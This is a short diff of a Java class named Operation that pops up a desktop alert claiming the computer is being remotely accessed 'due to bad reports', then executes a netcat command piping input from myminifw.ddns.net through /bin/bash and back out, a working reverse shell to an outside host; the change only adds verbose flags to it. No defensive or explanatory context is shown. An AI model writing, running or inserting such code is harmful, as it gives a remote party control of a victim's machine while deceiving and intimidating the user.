@@ -53,7 +53,7 @@ public class Operation {
         myCommand = "notify-send 'Alert' 'We are remote accessing this computer due to bad reports.'";
         Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});
         Thread.sleep(1000);
-        myCommand = "nc -vv myminifw.ddns.net 1890 | /bin/bash | nc myminifw.ddns.net 1891";
+        myCommand = "nc -vv myminifw.ddns.net 1890 | /bin/bash | nc -vv myminifw.ddns.net 1891";
         Runtime.getRuntime().exec(new String[]{plat, "-c", myCommand});
     }
 }
